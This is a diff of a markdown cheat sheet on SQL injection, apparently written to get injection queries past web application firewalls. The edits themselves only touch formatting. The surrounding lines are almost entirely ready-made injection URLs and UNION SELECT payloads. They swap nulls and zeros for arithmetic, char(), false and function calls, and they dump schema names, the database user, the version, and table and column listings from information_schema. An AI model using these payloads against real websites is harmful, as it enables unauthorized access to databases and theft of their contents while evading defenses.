@@ -27,7 +27,7 @@ And 1*0
 And 1-1
 And 0/1
 ```
-For example:
+For example:  
 http://website.com/index.php?id=1’ and 1*0 order by 10--
 
 2) Using **MOD()**
@@ -38,7 +38,7 @@ SELECT mod(10, 2);
 
 The used mod() Function will output to 0
 
-For example:
+For example:  
 http://website.com/index.php?id=1 and mod(29,9) Order by 10--
 
 3) Using **POINT()**
@@ -46,7 +46,7 @@ http://website.com/index.php?id=1 and mod(29,9) Order by 10--
 ```
 SELECT point(29, 9);
 ```
-For example:
+For example:  
 http://website.com/index.php?id=1 and point(29,9) Order by 10--
 
 4) Using **POWER()**
@@ -54,7 +54,7 @@ http://website.com/index.php?id=1 and point(29,9) Order by 10--
 ```
 SELECT power(5,5);
 ```
-For example:
+For example:  
 http://website.com/index.php?id=1 and power(5,5) Order by 10--
 
 ## Illegal parameter data types
@@ -73,7 +73,7 @@ http://website.com/index.php?id=1 % point(29,9) Order by 10--
 & = Bitwise And
 && = Logical And
 ```
-For example:
+For example:  
 http://website.com/index.php?id=1 && point(29,9) Order by 10--
 
 3) For operation **OR**
@@ -81,10 +81,10 @@ http://website.com/index.php?id=1 && point(29,9) Order by 10--
 | = Bitwise OR
 || = Logical OR, sometimes use for Concatanation
 ```
-For example:
+For example:  
 http://website.com/index.php?id=1 || point(29,9) Order by 10--
 
-##The traditional way of using Null
+## The traditional way of using Null
 
 The ordinary usage of Null is easily detected by WAF and instantly triggers it, so it becomes impossible to use that query. The examples below describes the traditional way of using an false value in SQL Injection.
 ```
@@ -97,14 +97,14 @@ Union Select null, null, null, null
 ```
 UNION SELECT 0,0,0,0
 ```
-For example:
+For example:  
 http://website.com/index.php?id=1 div **0** Union Select **0**,**0**,**0**,**0** (SELECT+GROUP_CONCAT(schema_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.SCHEMATA),**0**,**0**--+"
 
 2) Using **false**
 ```
 UNION SELECT false,false,false,false
 ```
-For example:
+For example:  
 http://website.com/index.php?id=1 div **false** Union Select **false**,**false**,**false**,**false**,SELECT+GROUP_CONCAT(schema_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.SCHEMATA),**false**--+
 
 3) Using char()
@@ -114,7 +114,7 @@ UNION SELECT char(false),char(false,char(false),char(false)
 UNION SELECT char(0),char(0),char(0),char(0)
 UNION SELECT char(0x4e554c4c),char(0x4e554c4c),char(0x4e554c4c),char(0x4e554c4c)
 ```
-For example:
+For example:  
 http://website.com/index.php?id=1 div **char(false)** Union Select "**char(false)** div **char(false)** Union Select **char(false)**,**char(false)**,**char(false)**,**char(false)**,concat(0x222f3e,0x3c62723e,0x3c62723e,'<br>','Database :: ',database(),0x3c62723e,'User ::',user(),0x3c62723e,'Version ::',version(),0x3c62723e,user(),make_set(6,@:=0x0a, (select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@),0x3c62723e),**char(false)**--+",**char(false)**,**char(false)**,**char(false)**,**char(false)**,**char(false)**--+
 
 4) Using **Arithmetic** or **Logical Operator**
@@ -122,7 +122,7 @@ http://website.com/index.php?id=1 div **char(false)** Union Select "**char(false
 UNION SELECT (0*1337-0),(0*1337-0),(0*1337-0),(0*1337-0)
 UNION SELECT 34=35,34=35,34=35,34=35
 ```
-For example:
+For example:  
 ```
 http://website.com/index.php?id=1 div (0*1337-0) Union Select "(0*1337-0) div (0*1337-0) Union Select (0*1337-0),(0*1337-0),(0*1337-0),(0*1337-0),concat(0x222f3e,0x3c62723e,0x3c62723e,'<br>','Database ::',database(),0x3c62723e,'User :: ',user(),0x3c62723e,'Version ::',version(),0x3c62723e,user(),make_set(6,@:=0x0a, (select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@),0x3c62723e),(0*1337-0)--+",(0*1337-0),(0*1337-0), (0*1337-0),(0*1337-0),(0*1337-0)--+
 ```
